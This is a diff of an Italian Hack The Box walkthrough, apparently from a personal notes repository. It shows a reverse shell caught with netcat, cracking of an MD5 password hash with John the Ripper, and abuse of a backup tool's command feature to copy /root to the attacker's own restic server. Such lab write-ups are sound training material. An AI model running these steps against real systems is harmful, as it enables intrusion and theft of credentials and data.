@@ -85,9 +85,11 @@ Quando si avvia il container docker creato saremo in una shell bash:
 Ora dal sito uploadare il file `exploit.h5`
 
 ![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/2025-10-22-23-17-52-image.png)
+
 mettersi in ascolto sulla porta 4444 ( `nc -nlvp 4444` ) e cliccare su `View Predictions` sul sito
 
 ![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/2025-10-22-23-18-49-image.png)
+
 Siamo dentro con l'utente `app`
 Vediamo che nella cartella /home ci sono due cartelle: app e gael che probabilmente è un utente che troviamo anche in /etc/passwd
 ![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/2025-10-22-23-19-45-image.png)
@@ -98,12 +100,14 @@ Con [[linpeas]]troviamo il file `/home/app/app/instance/users.db`
 che possiamo esaminare:
 
 ![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/2025-10-22-23-20-17-image.png)
+
 Questa chiave `c99175974b6e192936d97224638a34f8` è un hash MD5 che potrebbe essere la password dell'user gael
 
 Creiamo un file `hash.txt` che contiene la hash di gael e proviamo a craccarla con [[johntheripper]]
 `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-md5`
 
 ![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/2025-10-22-23-20-48-image.png)
+
 Troviamo la password: `mattp005numbertwo`
 
 Con la password trovata possiamo entrare nell'utente gael con ssh `ssh gael@10.10.11.74`
@@ -116,6 +120,7 @@ Scarichiamolo sul nostro pc e apriamolo ( `tar -xvf backrest_backup.tar.gz` )
 Nella cartella `backrest/.config/backrest` troviamo il file `config.json`:
 
 ![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/2025-10-22-23-21-39-image.png)
+
 Questa è una **password cifrata con bcrypt** Analizziamo i dettagli:
 
 ### Struttura del dato:
@@ -194,6 +199,7 @@ Accediamo con Username: `backrest_root` e Password: `!@#$%^`
 Dopo aver fatto l'accesso dovremo creare una nuova repo (+ Add Repo)
 
 ![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/2025-10-22-23-23-38-image.png)
+
 mettendo un nome (repox), URI /opt e una password (123456)
 ![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/2025-10-22-23-24-15-image.png)
 
@@ -203,6 +209,7 @@ Mettiamoci in ascolto sulla nostra macchina con
 Poi sul sito selezioniamo la repo creata e clicchiamo su Run Command
 
 ![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/2025-10-22-23-24-48-image.png)
+
 Poi inseriamo i seguenti comandi:
 `-r rest:http://<NOSTRO IP>:12345/repox init`
 `-r rest:http://<NOSTRO IP>:12345/repox backup /root`
@@ -211,6 +218,7 @@ Sulla nostra macchina inseriamo i comandi:
 `restic -r /tmp/restic-data/repox snapshots`
 
 ![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/2025-10-22-23-25-24-image.png)
+
 `restic -r /tmp/restic-data/repox restore f8118067 --target ./restore`   (f8118067 è l'ID della repo)
 
 Poi con il comando `cat restore/root/root.txt` otteniamo la flag root
